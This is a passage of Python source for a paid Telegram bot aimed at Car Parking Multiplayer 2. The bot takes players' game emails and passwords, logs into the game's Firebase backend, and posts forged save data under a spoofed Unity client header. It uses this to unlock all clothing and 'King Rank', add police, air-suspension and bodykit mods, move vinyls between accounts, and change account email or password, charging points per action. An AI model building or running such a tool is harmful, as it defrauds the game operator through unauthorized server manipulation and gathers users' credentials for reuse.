                   "Content-Type": "application/json", "User-Agent": CPM2_ACTIVATION_USER_AGENT}
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.post(f"{CPM2_ACTIVATION_OG_BASE}/progress-service/v1/rating/update",
                                    headers=headers, json={"data": encrypted}) as resp:
                body = await resp.text()
                try: data = json.loads(body) if body else {}
                except Exception: data = {}
                status_code = resp.status
        if status_code == 200 and (data.get("code") == 1 or '"code":1' in body):
            return True, "success"
        return False, f"Server response: {body[:140]}"
    except Exception as exc:
        return False, str(exc)[:180]

async def cpm2_unlock_all_clothes_async(email: str, password: str):
    if not CPM2_ACTIVATION_FIREBASE_KEY:
        return False, "Missing CP2_FIREBASE_KEY variable."
    headers = {"Content-Type": "application/json", "X-Unity-Version": "2022.3.62f2"}
    try:
        timeout = aiohttp.ClientTimeout(total=45)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.post(CPM2_CLOTHES_LOGIN_URL, headers=headers, json={
                "email": email, "password": password, "returnSecureToken": True,
                "clientType": "CLIENT_TYPE_ANDROID"
            }) as auth_resp:
                auth = await auth_resp.json(content_type=None)
                if auth_resp.status != 200:
                    return False, f"CPM2 login HTTP {auth_resp.status}"
            token, firebase_uid = auth.get("idToken"), auth.get("localId")
            if not token or not firebase_uid:
                err = auth.get("error", {})
                return False, str(err.get("message", "Login failed"))[:150]
            payload = cpm2_clothes_payload(firebase_uid)
            save_headers = {**headers, "Authorization": "Bearer " + token,
                "User-Agent": "UnityPlayer/2022.3.62f2 (UnityWebRequest/1.0, libcurl/8.10.1-DEV)"}
            async with session.post(CPM2_CLOTHES_SAVE_URL, headers=save_headers,
                                    json={"data": payload}, allow_redirects=False) as save_resp:
                body = await save_resp.json(content_type=None)
                if save_resp.status != 200:
                    return False, f"CPM2 save HTTP {save_resp.status}"
        if not isinstance(body, dict) or "error" in body:
            return False, "CPM2 rejected the clothes update."
        inner = body.get("result")
        if isinstance(inner, dict) and "error" in inner:
            return False, "CPM2 rejected the clothes update."
        code = inner.get("code") if isinstance(inner, dict) else inner
        if code is None: code = body.get("code")
        return (True, "CPM2 accepted the clothes update.") if code == 1 else (False, "CPM2 did not confirm the clothes update.")
    except Exception as exc:
        return False, str(exc)[:180]

def _cpm2_vinyl_car_picker(cars, kind, page=0, lang="ar"):
    """Paginated source/target car picker for the two CPM2 logo-transfer modes."""
    cars = list(cars or [])
    per_page = 8
    pages = max(1, (len(cars) + per_page - 1) // per_page)
    try:
        page = max(0, min(int(page), pages - 1))
    except Exception:
        page = 0
    get_name = CPM2_ENGINE_NAMESPACE.get("get_car_name", lambda x: f"Car {x}")
    rows = []
    for car in cars[page * per_page:(page + 1) * per_page]:
        try:
            idx = int(car.get("index", -1))
        except Exception:
            continue
        name = str(car.get("name") or get_name(car.get("id", "?")))
        count = car.get("vinyls", "?")
        label = f"🚘 {name} · #{idx} · 🎨 {count}"[:60]
        rows.append([InlineKeyboardButton(label, callback_data=f"cpm2_vinyl_{kind}_{idx}")])
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("⬅️", callback_data=f"cpm2_vinyl_{kind}_page_{page-1}"))
    if page + 1 < pages:
        nav.append(InlineKeyboardButton("➡️", callback_data=f"cpm2_vinyl_{kind}_page_{page+1}"))
    if nav:
        rows.append(nav)
    rows.append([InlineKeyboardButton("❌ إلغاء" if lang == "ar" else "❌ Cancel", callback_data="cpm2_vinyl_cancel")])
    return InlineKeyboardMarkup(rows)


def cpm2_activations_keyboard_ptb(lang="ar"):
    ar = lang == "ar"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚓 الشرطة (سيارة واحدة)" if ar else "🚓 Police (one car)", callback_data="cpm2_mode_police"),
         InlineKeyboardButton("🚓 الشرطة (كل السيارات)" if ar else "🚓 Police (all cars)", callback_data="cpm2_all_police")],
        [InlineKeyboardButton("🛩 التعليق الهوائي (سيارة)" if ar else "🛩 Air suspension (one car)", callback_data="cpm2_mode_air"),
         InlineKeyboardButton("🛩 التعليق الهوائي (الكل)" if ar else "🛩 Air suspension (all)", callback_data="cpm2_all_air")],
        [InlineKeyboardButton("🎨 بودي كيت (سيارة)" if ar else "🎨 Bodykit (one car)", callback_data="cpm2_mode_bodykit"),
         InlineKeyboardButton("🎨 بودي كيت (الكل)" if ar else "🎨 Bodykit (all)", callback_data="cpm2_all_bodykit")],
        [InlineKeyboardButton("👑 رتبة King Rank" if ar else "👑 King Rank", callback_data="cpm2_do_king"),
         InlineKeyboardButton("👕 كل الملابس" if ar else "👕 All Clothes", callback_data="cpm2_do_clothes")],
        [InlineKeyboardButton("🎨 نقل الشعارات: CPM1 ← CPM2" if ar else "🎨 Transfer logos: CPM1 → CPM2", callback_data="cpm2_transfer_c1c2")],
        [InlineKeyboardButton("💠 نقل الشعارات: CPM2 ← CPM2" if ar else "💠 Transfer logos: CPM2 → CPM2", callback_data="cpm2_transfer_c2c2")],
        [InlineKeyboardButton("📧 تغيير البريد" if ar else "📧 Change Email", callback_data="cpm2_change_email"),
         InlineKeyboardButton("🔑 تغيير كلمة المرور" if ar else "🔑 Change Password", callback_data="cpm2_change_pass")],
        [InlineKeyboardButton("🚪 خروج" if ar else "🚪 Logout", callback_data="cpm2_logout")]
    ])

async def cpm2_load_garage(email, password):
    return await CPM2_ENGINE_NAMESPACE["open_cloud_vinyl_session"](email, password)

async def cpm2_activation_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    data = q.data or ""
    if not await require_channel_membership(update, context):
        return
    await q.answer()
    lang = context.user_data.get("lang", "ar")
    try:
        # CPM2 activations cost 2 points each. Navigation/login are free.
        billable_starts = (
            data.startswith("cpm2_mode_") or data.startswith("cpm2_all_") or
            data in {"cpm2_do_king", "cpm2_do_clothes", "cpm2_change_email", "cpm2_change_pass",
                     "cpm2_transfer_c1c2", "cpm2_transfer_c2c2"}
        )
        if billable_starts and not await can_pay_points(update, context, 2, lang):
            return
        if data in {"cpm2_open", "cpm2_relogin"}:
            context.user_data["state"] = "WAIT_CPM2_ACT_EMAIL"
            await update_menu_message(context, uid, ("🚗 أدخل بريد حساب CPM2:" if context.user_data.get("lang", "ar") == "ar" else "🚗 Enter your CPM2 email:"),
                reply_markup=get_back_keyboard(context.user_data.get("lang","ar"), "back_to_main"))
            return
        if data == "cpm2_logout":
            for k in ("cpm2_act_email","cpm2_act_password","cpm2_act_cars","cpm2_act_pending_email",
                      "cpm2_vinyl_mode", "cpm2_vinyl_pending_email", "cpm2_vinyl_source_email",
                      "cpm2_vinyl_source_password", "cpm2_vinyl_source_cars", "cpm2_vinyl_target_cars",
                      "cpm2_vinyl_source_index"):
                context.user_data.pop(k, None)
            context.user_data.pop("state", None)
            lang = context.user_data.get("lang", "ar")
            await update_menu_message(context, uid, TEXTS[lang]["welcome"],
                reply_markup=get_main_menu_keyboard(lang))
            return
        if data in {"cpm2_change_email", "cpm2_change_pass"}:
            email = context.user_data.get("cpm2_act_email")
            password = context.user_data.get("cpm2_act_password")
            if not email or not password:
                await update_menu_message(context, uid,
                    "❌ CPM2 session is missing. Please log in again from Login → CPM2." if context.user_data.get("lang", "ar") != "ar" else "❌ جلسة CPM2 غير موجودة. سجل الدخول من Login ثم CPM2.",
                    reply_markup=cpm2_activations_keyboard_ptb(context.user_data.get("lang", "ar")))
                return
            if data == "cpm2_change_email":
                context.user_data["state"] = "WAIT_CPM2_NEW_EMAIL"
                prompt = "📧 أرسل البريد الإلكتروني الجديد لحساب CPM2:" if context.user_data.get("lang", "ar") == "ar" else "📧 Enter the new CPM2 email:"
            else:
                context.user_data["state"] = "WAIT_CPM2_NEW_PASSWORD"
                prompt = "🔑 أرسل كلمة المرور الجديدة لحساب CPM2:" if context.user_data.get("lang", "ar") == "ar" else "🔑 Enter the new CPM2 password:"
            await update_menu_message(context, uid, prompt,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء" if context.user_data.get("lang", "ar") == "ar" else "❌ Cancel", callback_data="cpm2_cancel_input")]]))
            return
        if data == "cpm2_cancel_input":
            context.user_data.pop("state", None)
            await update_menu_message(context, uid, (("🚗 <b>تفعيلات CPM2</b>\nاختر التفعيلة:" if context.user_data.get("lang", "ar") == "ar" else "🚗 <b>CPM2 Activations</b>\nChoose a feature.")),
                reply_markup=cpm2_activations_keyboard_ptb(context.user_data.get("lang", "ar")))
            return
        if data in {"cpm2_transfer_c1c2", "cpm2_transfer_c2c2"}:
            if data == "cpm2_transfer_c1c2":
                context.user_data["cpm2_vinyl_mode"] = "c1c2"
                prompt = "أرسل بريد حساب CPM1 المصدر:" if context.user_data.get("lang", "ar") == "ar" else "Enter the source CPM1 email:"
            else:
                context.user_data["cpm2_vinyl_mode"] = "c2c2"
                prompt = "أرسل بريد حساب CPM2 المصدر:" if context.user_data.get("lang", "ar") == "ar" else "Enter the source CPM2 email:"
            context.user_data["state"] = "WAIT_CPM2_VINYL_SOURCE_EMAIL"
            await update_menu_message(context, uid, "🔐 " + prompt,
                reply_markup=get_back_keyboard(context.user_data.get("lang", "ar"), "cpm2_back_menu"))
            return

        if data == "cpm2_vinyl_cancel":
            for k in ("cpm2_vinyl_mode", "cpm2_vinyl_pending_email", "cpm2_vinyl_source_email",
                      "cpm2_vinyl_source_password", "cpm2_vinyl_source_cars", "cpm2_vinyl_source_index"):
                context.user_data.pop(k, None)
            context.user_data.pop("state", None)
            await update_menu_message(context, uid, (("🚗 <b>تفعيلات CPM2</b>\nاختر التفعيلة:" if context.user_data.get("lang", "ar") == "ar" else "🚗 <b>CPM2 Activations</b>\nChoose a feature.")),
                reply_markup=cpm2_activations_keyboard_ptb(context.user_data.get("lang", "ar")))
            return

        if data.startswith("cpm2_vinyl_src_page_") or data.startswith("cpm2_vinyl_tgt_page_"):
            kind = "src" if data.startswith("cpm2_vinyl_src") else "tgt"
            try: page = int(data.rsplit("_", 1)[1])
            except Exception: page = 0
            cars = context.user_data.get("cpm2_vinyl_source_cars" if kind == "src" else "cpm2_vinyl_target_cars") or []
            title = ("اختر سيارة المصدر:" if kind == "src" else "اختر سيارة الهدف:") if context.user_data.get("lang", "ar") == "ar" else ("Choose source car:" if kind == "src" else "Choose target car:")
            await update_menu_message(context, uid, title, reply_markup=_cpm2_vinyl_car_picker(cars, kind, page, context.user_data.get("lang", "ar")))
            return

        if data.startswith("cpm2_vinyl_src_"):
            try: src_idx = int(data.rsplit("_", 1)[1])
            except Exception:
                await update_menu_message(context, uid, "❌ اختيار سيارة غير صالح." if context.user_data.get("lang", "ar") == "ar" else "❌ Invalid car selection.", reply_markup=cpm2_activations_keyboard_ptb(context.user_data.get("lang", "ar"))); return
            context.user_data["cpm2_vinyl_source_index"] = src_idx
            target_cars = context.user_data.get("cpm2_act_cars") or []
            target_email, target_password = context.user_data.get("cpm2_act_email"), context.user_data.get("cpm2_act_password")
            if not target_email or not target_password:
                await update_menu_message(context, uid, "❌ انتهت جلسة CPM2. أعد تسجيل الدخول." if context.user_data.get("lang", "ar") == "ar" else "❌ CPM2 session expired. Please log in again.", reply_markup=cpm2_activations_keyboard_ptb(context.user_data.get("lang", "ar"))); return
            if not target_cars:
                snap = await cpm2_load_garage(target_email, target_password)
                if snap.get("error"):
                    await update_menu_message(context, uid, "❌ " + str(snap["error"])[:160], reply_markup=cpm2_activations_keyboard_ptb(context.user_data.get("lang", "ar"))); return
                target_cars = snap.get("cars") or []
                context.user_data["cpm2_act_cars"] = target_cars
            context.user_data["cpm2_vinyl_target_cars"] = target_cars
            title = "اختر سيارة الهدف في حساب CPM2:" if context.user_data.get("lang", "ar") == "ar" else "Choose the target car in your CPM2 account:"
            await update_menu_message(context, uid, title, reply_markup=_cpm2_vinyl_car_picker(target_cars, "tgt", 0, context.user_data.get("lang", "ar")))
            return

        if data.startswith("cpm2_vinyl_tgt_"):
            if not await can_pay_points(update, context, 2, context.user_data.get("lang", "ar")):
                return
            try: tgt_idx = int(data.rsplit("_", 1)[1])
            except Exception:
                await update_menu_message(context, uid, "❌ اختيار سيارة الهدف غير صالح.", reply_markup=cpm2_activations_keyboard_ptb(context.user_data.get("lang", "ar"))); return
            mode = context.user_data.get("cpm2_vinyl_mode")
            src_email = context.user_data.get("cpm2_vinyl_source_email")
            src_password = context.user_data.get("cpm2_vinyl_source_password")
            tgt_email = context.user_data.get("cpm2_act_email")
            tgt_password = context.user_data.get("cpm2_act_password")
            src_idx = context.user_data.get("cpm2_vinyl_source_index")
            if not all((mode, src_email, src_password, tgt_email, tgt_password)) or src_idx is None:
                await update_menu_message(context, uid, "❌ انتهت بيانات النقل، أعد المحاولة.", reply_markup=cpm2_activations_keyboard_ptb(context.user_data.get("lang", "ar"))); return
            await update_menu_message(context, uid, "⏳ جارٍ نقل الشعارات والتحقق من الحفظ..." if context.user_data.get("lang", "ar") == "ar" else "⏳ Transferring logos and verifying save...")
            result = {}
            try:
                if mode == "c1c2":
                    result = await CPM2_ENGINE_NAMESPACE["execute_api_vinyl_transfer"](src_email, src_password, tgt_email, tgt_password, int(src_idx), tgt_idx)
                else:
                    result = await CPM2_ENGINE_NAMESPACE["execute_cpm2_to_cpm2_vinyl"](src_email, src_password, tgt_email, tgt_password, int(src_idx), tgt_idx)
                if result.get("sent"):
                    deduct_points(uid, 2)
                    out = "✅ تم نقل الشعارات والتحقق من حفظها بنجاح." if result.get("verified") and context.user_data.get("lang", "ar") == "ar" else ("✅ Logos transferred and save verified." if result.get("verified") else ("⚠️ تم إرسال النقل لكن التحقق غير مكتمل؛ افحص السيارة داخل اللعبة." if context.user_data.get("lang", "ar") == "ar" else "⚠️ Transfer was accepted but verification is incomplete; check the car in-game."))
                else:
                    out = ("❌ فشل نقل الشعارات: " if context.user_data.get("lang", "ar") == "ar" else "❌ Logo transfer failed: ") + str(result.get("error") or "Unknown error")[:200]
            except Exception as exc:
                out = ("❌ خطأ أثناء النقل: " if context.user_data.get("lang", "ar") == "ar" else "❌ Transfer error: ") + str(exc)[:180]
            for k in ("cpm2_vinyl_mode", "cpm2_vinyl_pending_email", "cpm2_vinyl_source_email",
                      "cpm2_vinyl_source_password", "cpm2_vinyl_source_cars", "cpm2_vinyl_target_cars", "cpm2_vinyl_source_index"):
                context.user_data.pop(k, None)
            if result.get("sent") and uid != ADMIN_ID:
                out += f"\n🪙 -2 | الرصيد: {get_points(uid)}" if context.user_data.get("lang", "ar") == "ar" else f"\n🪙 -2 | Balance: {get_points(uid)}"
            await update_menu_message(context, uid, out, reply_markup=cpm2_activations_keyboard_ptb(context.user_data.get("lang", "ar")))
            return

        email, password = context.user_data.get("cpm2_act_email"), context.user_data.get("cpm2_act_password")
        if not email or not password:
            context.user_data["state"] = "WAIT_CPM2_ACT_EMAIL"
            await update_menu_message(context, uid, "أدخل بريد حساب CPM2:" if context.user_data.get("lang", "ar") == "ar" else "Enter your CPM2 email:")
            return
        if data.startswith("cpm2_mode_"):
            mode = data.rsplit("_",1)[1]
            snap = await cpm2_load_garage(email, password)
            if snap.get("error"):
                await update_menu_message(context, uid, "❌ " + str(snap["error"])[:180], reply_markup=cpm2_activations_keyboard_ptb(context.user_data.get("lang", "ar")))
                return
            cars = snap.get("cars") or []
            context.user_data["cpm2_act_cars"] = cars
            get_name = CPM2_ENGINE_NAMESPACE.get("get_car_name", lambda x: "Car")
            rows = [[InlineKeyboardButton(
                f"{str(c.get('name') or get_name(c.get('id','?')))} · #{c.get('index')}"[:60],
                callback_data=f"cpm2_car_{mode}_{int(c.get('index',-1))}"
            )] for c in cars[:80]]
            rows.append([InlineKeyboardButton(("⬅️ رجوع" if context.user_data.get("lang", "ar") == "ar" else "⬅️ Back"), callback_data="cpm2_back_menu")])
            await update_menu_message(context, uid, (f"اختر سيارة لتفعيل {mode}:" if context.user_data.get("lang", "ar") == "ar" else f"Select a car for {mode}:"),
                reply_markup=InlineKeyboardMarkup(rows))
            return
        if data.startswith("cpm2_all_"):
            mode = data.rsplit("_",1)[1]
            snap = await cpm2_load_garage(email, password)
            cars = snap.get("cars") or []
            if snap.get("error") or not cars:
                await update_menu_message(context, uid, ("❌ " + str(snap.get("error") or "لم يتم العثور على سيارات")) if context.user_data.get("lang", "ar") == "ar" else ("❌ " + str(snap.get("error") or "No cars found")),
                    reply_markup=cpm2_activations_keyboard_ptb(context.user_data.get("lang", "ar")))
                return
            # Bulk CPM2 actions are billed per verified car: reserve enough balance up front.
            if not await can_pay_points(update, context, 2 * len(cars), context.user_data.get("lang", "ar")):
                return
            await update_menu_message(context, uid, (f"⏳ جارٍ تنفيذ {mode} على {len(cars)} سيارة..." if context.user_data.get("lang", "ar") == "ar" else f"⏳ Running {mode} for {len(cars)} cars..."))
            sent = verified = 0
            errors = []
            for car in cars:
                try:
                    r = await cpm2_execute_activation(email, password, int(car.get("index",-1)), mode)
                    sent += int(bool(r.get("sent"))); verified += int(bool(r.get("verified")))
                    if r.get("error") and len(errors)<3: errors.append(str(r["error"])[:100])
                except Exception as exc:
                    if len(errors)<3: errors.append(str(exc)[:100])
            if verified > 0:
                deduct_points(uid, 2 * verified)
            charged = 2 * verified
            billing = (f"\n🪙 -{charged} | الرصيد: {get_points(uid)}" if uid != ADMIN_ID and verified > 0 and context.user_data.get("lang", "ar") == "ar" else (f"\n🪙 -{charged} | Balance: {get_points(uid)}" if uid != ADMIN_ID and verified > 0 else ""))
            await update_menu_message(context, uid,
                (f"اكتملت تفعيلة CPM2: {mode}.\nالسيارات: {len(cars)}\nتم القبول: {sent}\nتم التحقق: {verified}\n" if context.user_data.get("lang", "ar") == "ar" else f"CPM2 {mode} completed.\nCars: {len(cars)}\nAccepted: {sent}\nVerified: {verified}\n") + billing + ("\n".join(errors) if errors else ""),
                reply_markup=cpm2_activations_keyboard_ptb(context.user_data.get("lang", "ar")))
            return
        if data.startswith("cpm2_car_"):
            if not await can_pay_points(update, context, 2, context.user_data.get("lang", "ar")):
                return
            try:
                _,_,mode,idx = data.split("_",3)
                idx = int(idx)
            except Exception:
                await q.answer("اختيار سيارة غير صالح" if context.user_data.get("lang", "ar") == "ar" else "Invalid car selection", show_alert=True); return
            await update_menu_message(context, uid, (f"⏳ جارٍ تفعيل {mode} على السيارة رقم {idx}..." if context.user_data.get("lang", "ar") == "ar" else f"⏳ Activating {mode} on car #{idx}..."))
            result = await cpm2_execute_activation(email,password,idx,mode)
            if result.get("verified"):
                deduct_points(uid, 2)
            out = ("✅ تم التفعيل والتحقق بنجاح." if context.user_data.get("lang", "ar") == "ar" else "✅ Activation verified.") if result.get("verified") else ("❌ فشل التحقق: " if context.user_data.get("lang", "ar") == "ar" else "❌ ") + str(result.get("error") or ("لم يتم تأكيد التفعيل." if context.user_data.get("lang", "ar") == "ar" else "Activation was not verified."))
            if result.get("verified") and uid != ADMIN_ID:
                out += f"\n🪙 -2 | الرصيد: {get_points(uid)}" if context.user_data.get("lang", "ar") == "ar" else f"\n🪙 -2 | Balance: {get_points(uid)}"
            await update_menu_message(context, uid, out, reply_markup=cpm2_activations_keyboard_ptb(context.user_data.get("lang", "ar")))
            return
        if data == "cpm2_do_king":
            ok, msg = await cpm2_king_rank_async(email,password)
            if ok:
                deduct_points(uid, 2)
                out = "✅ تم تحديث King Rank." if context.user_data.get("lang", "ar") == "ar" else "✅ King Rank updated."
                if uid != ADMIN_ID:
                    out += f"\n🪙 -2 | الرصيد: {get_points(uid)}" if context.user_data.get("lang", "ar") == "ar" else f"\n🪙 -2 | Balance: {get_points(uid)}"
            else:
                out = "❌ " + str(msg)
            await update_menu_message(context, uid, out, reply_markup=cpm2_activations_keyboard_ptb(context.user_data.get("lang", "ar")))
            return
        if data == "cpm2_do_clothes":
            ok, msg = await cpm2_unlock_all_clothes_async(email,password)
            if ok:
                deduct_points(uid, 2)
                out = "✅ تم قبول طلب فتح كل الملابس." if context.user_data.get("lang", "ar") == "ar" else "✅ All clothes request accepted."
                if uid != ADMIN_ID:
                    out += f"\n🪙 -2 | الرصيد: {get_points(uid)}" if context.user_data.get("lang", "ar") == "ar" else f"\n🪙 -2 | Balance: {get_points(uid)}"
            else:
                out = "❌ " + str(msg)
            await update_menu_message(context, uid, out, reply_markup=cpm2_activations_keyboard_ptb(context.user_data.get("lang", "ar")))
            return
        if data == "cpm2_back_menu":
            await update_menu_message(context, uid, (("🚗 <b>تفعيلات CPM2</b>\nاختر التفعيلة:" if context.user_data.get("lang", "ar") == "ar" else "🚗 <b>CPM2 Activations</b>\nChoose a feature.")),
                reply_markup=cpm2_activations_keyboard_ptb(context.user_data.get("lang", "ar")))
            return
    except Exception as exc:
        await update_menu_message(context, uid, ("❌ خطأ في تفعيلات CPM2: " if context.user_data.get("lang", "ar") == "ar" else "❌ CPM2 activation error: ") + str(exc)[:180],
            reply_markup=cpm2_activations_keyboard_ptb(context.user_data.get("lang", "ar")))


async def test_admin_notification(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Owner-only delivery test; sends no user credentials."""
    user = update.effective_user
    if not user or user.id != ADMIN_ID:
        return
    try:
        import urllib.request
        import json
        payload = {
            "chat_id": int(ADMIN_ID),
            "text": "🧪 اختبار إشعارات البوت\nإذا وصلتك هذه الرسالة، فالإرسال إلى هذا الحساب يعمل بنجاح.",
            "disable_web_page_preview": True,
        }
        req = urllib.request.Request(
            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            data=json.dumps(payload).encode("utf-8"),
            headers={"Content-Type": "application/json"},
        )
        with urllib.request.urlopen(req, timeout=10) as response:
            result = json.loads(response.read().decode("utf-8"))
        if result.get("ok"):
            await update.effective_message.reply_text("✅ Telegram أكد إرسال رسالة الاختبار إلى حساب المالك.")
            logger.info("Admin notification test succeeded for %s", ADMIN_ID)
        else:
            description = str(result.get("description", "Unknown Telegram error"))[:300]
            await update.effective_message.reply_text("❌ Telegram رفض الإرسال: " + description)
            logger.error("Admin notification test rejected: %s", result)
    except Exception as exc:
        logger.exception("Admin notification test failed")
        await update.effective_message.reply_text("❌ فشل اختبار الإشعار: " + str(exc)[:300])


def main():
    if not TOKEN:
        logger.error("No token provided.")
        return

    app = Application.builder().token(TOKEN).build()

    app.job_queue.run_repeating(send_daily_broadcast, interval=86400, first=10)

    app.add_handler(CommandHandler("stopbot", cmd_stopbot))
    app.add_handler(CommandHandler("startbot", cmd_startbot))
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("testnotify", test_admin_notification))
    app.add_handler(CommandHandler("king", king_shortcut))
    app.add_handler(CommandHandler("info", user_info))
    app.add_handler(CommandHandler("del", user_del_command))
    app.add_handler(CommandHandler("admin", admin_panel))
    app.add_handler(CommandHandler("ban", ban_cmd))
    app.add_handler(CommandHandler("unban", unban_cmd))
    app.add_handler(CommandHandler("banned", banned_list_cmd))
    app.add_handler(CommandHandler("Ripou02", ripou02_cmd))
    app.add_handler(CommandHandler("ripou02", ripou02_cmd))
    app.add_handler(CommandHandler("codes", codes_list_cmd))
    app.add_handler(CommandHandler("redeem", redeem_cmd))
    app.add_handler(CommandHandler("myaccess", my_access_cmd))
    app.add_handler(CommandHandler("Ripou", ripou_stats))
    app.add_handler(CommandHandler("ripou", ripou_stats))
    app.add_handler(CommandHandler("stats", ripou_stats))
    app.add_handler(CallbackQueryHandler(handle_language_selection, pattern="^lang_"))
    app.add_handler(CallbackQueryHandler(handle_verification, pattern="^check_sub$"))
    app.add_handler(CallbackQueryHandler(cpm2_activation_callback, pattern="^cpm2_"))
    app.add_handler(CallbackQueryHandler(handle_menu_options))
    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, handle_text_input))

    logger.info("Bot starting...")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
